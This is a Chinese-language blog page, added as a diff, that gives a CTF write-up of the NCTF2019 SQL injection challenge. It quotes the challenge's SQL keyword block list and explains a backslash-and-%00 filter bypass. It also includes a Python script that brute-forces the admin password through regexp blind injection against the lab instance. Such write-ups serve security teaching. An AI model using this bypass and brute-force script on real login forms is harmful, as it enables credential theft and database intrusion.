@@ -1,0 +1,204 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta charset="utf-8" >
+
+<title>[NCTF2019]SQLi(regexp注入) | 过客</title>
+<meta name="description" content="this is a test Web">
+
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no">
+
+<link rel="stylesheet" href="https://use.fontawesome.com/releases/v5.7.2/css/all.css" integrity="sha384-fnmOCqbTlWIlj8LyTjo7mOUStjsKC4pOpQbqyi7RrhN7udi9RwhKkMHpvLbHG9Sr" crossorigin="anonymous">
+<link rel="shortcut icon" href="https://guokeya.github.io/favicon.ico?v=1582185509296">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link rel="stylesheet" href="https://guokeya.github.io/styles/main.css">
+
+
+
+<script src="https://cdn.jsdelivr.net/npm/vue/dist/vue.js"></script>
+<script src="https://cdn.bootcss.com/highlight.js/9.12.0/highlight.min.js"></script>
+
+<link rel="stylesheet" href="https://unpkg.com/aos@next/dist/aos.css" />
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main">
+
+      <div class="sidebar" :class="{ 'full-height': menuVisible }">
+  <div class="top-container" data-aos="fade-right">
+    <div class="top-header-container">
+      <a class="site-title-container" href="https://guokeya.github.io">
+        <img src="https://guokeya.github.io/images/avatar.png?v=1582185509296" class="site-logo">
+        <h1 class="site-title">过客</h1>
+      </a>
+      <div class="menu-btn" @click="menuVisible = !menuVisible">
+        <div class="line"></div>
+      </div>
+    </div>
+    <div>
+      
+        
+          <a href="/" class="site-nav">
+            首页
+          </a>
+        
+      
+        
+          <a href="/archives" class="site-nav">
+            归档
+          </a>
+        
+      
+        
+          <a href="/post/about" class="site-nav">
+            关于
+          </a>
+        
+      
+        
+          <a href="/tags" class="site-nav">
+            分类
+          </a>
+        
+      
+    </div>
+  </div>
+  <div class="bottom-container" data-aos="flip-up" data-aos-offset="0">
+    <div class="social-container">
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    </div>
+    <div class="site-description">
+      this is a test Web
+    </div>
+    <div class="site-footer">
+       | <a class="rss" href="https://guokeya.github.io/atom.xml" target="_blank">RSS</a>
+    </div>
+  </div>
+</div>
+
+
+      <div class="main-container">
+        <div class="content-container" data-aos="fade-up">
+          <div class="post-detail">
+            <h2 class="post-title">[NCTF2019]SQLi(regexp注入)</h2>
+            <div class="post-date">2020-01-26</div>
+            
+            <div class="post-content">
+              <p>主页就一个登录框 。把sql语句显示出来了。</p>
+<!-- more -->
+<p><img src="https://guokeya.github.io/post-images/1580039005761.png" alt="" loading="lazy"><br>
+再进行一波信息搜集。看看robots.txt<br>
+有个hint.txt</p>
+<pre><code>$black_list = &quot;/limit|by|substr|mid|,|admin|benchmark|like|or|char|union|substring|select|greatest|%00|\'|=| |in|&lt;|&gt;|-|\.|\(\)|#|and|if|database|users|where|table|concat|insert|join|having|sleep/i&quot;;
+If $_POST['passwd'] === admin's password,
+Then you will get the flag;
+</code></pre>
+<p>拿到flag的条件是post的密码要等于admin密码。并没有对用户名做限制<br>
+过滤了很多字符串。这里select字段被过滤了。但是没关系。mysql同一张表中的字段不需要select即可查询。这里只能用盲注。盲注还分时间盲注等。这里regexp即可绕过过滤<br>
+在Mysql种%00也是注释符。但是前面必须得加；<br>
+<img src="https://guokeya.github.io/post-images/1580039319282.png" alt="" loading="lazy"><br>
+此时执行的sql语句为</p>
+<pre><code>select * from users where username='\' and passwd='||1;%00'
+#where username='xxxx'||1
+条件为真时。就会跳转。
+条件为假时。就会回到登陆页
+</code></pre>
+<p>我们可以通过regexp来一位位判断密码<br>
+由于数据库中密码数据比较多。所以存在很多的密码<br>
+得一个个试。有那么多条数据。<br>
+<img src="https://guokeya.github.io/post-images/1580039623390.png" alt="" loading="lazy"><br>
+最后y(79)开头的那条数据。比较特殊。开头三位是you<br>
+写个脚本爆破下这条数据</p>
+<pre><code>import requests
+from urllib import parse
+import string
+import time
+str1 = string.ascii_letters+'_'+string.digits
+url='http://9d86404e-b5c0-41ff-b8ef-f9bbf6da8e8c.node3.buuoj.cn/index.php'
+flag='79'
+a=parse.unquote('%00')
+for i in range(50):
+    for i in str1:
+        data={&quot;username&quot;:&quot;\\&quot;,
+              &quot;passwd&quot;:&quot;||passwd/**/regexp/**/0x&quot;+flag+hex(ord(i)).replace('0x','')+&quot;;&quot;+a
+            }
+        r=requests.post(url=url,data=data)
+        if 'welcome.php' in r.text:
+            flag+=hex(ord(i)).replace('0x','')
+            print(flag)
+            break
+        time.sleep(0.5)
+        #防止429
+</code></pre>
+<p><img src="https://guokeya.github.io/post-images/1580039817830.png" alt="" loading="lazy"><br>
+用户名随意。密码填跑出来的密码。<br>
+因为flag条件为POST密码==admin密码即可。<br>
+<img src="https://guokeya.github.io/post-images/1580039860567.png" alt="" loading="lazy"></p>
+
+            </div>
+            
+              <div class="tag-container">
+                
+                  <a href="https://guokeya.github.io/tag/CTF/" class="tag">
+                    CTF
+                  </a>
+                
+                  <a href="https://guokeya.github.io/tag/Web/" class="tag">
+                    Web安全
+                  </a>
+                
+              </div>
+            
+            
+              <div class="next-post">
+                <div class="next">下一篇</div>
+                <a href="https://guokeya.github.io/post/fbctf2019eventssti3/">
+                  <h3 class="post-title">
+                    [FBCTF2019]Event(SSTI3)
+                  </h3>
+                </a>
+              </div>
+            
+
+            
+
+          </div>
+
+        </div>
+      </div>
+    </div>
+
+    <script src="https://unpkg.com/aos@next/dist/aos.js"></script>
+
+<script type="application/javascript">
+
+AOS.init();
+
+hljs.initHighlightingOnLoad()
+
+var app = new Vue({
+  el: '#app',
+  data: {
+    menuVisible: false,
+  },
+})
+
+</script>
+
+
+
+
+  </body>
+</html>
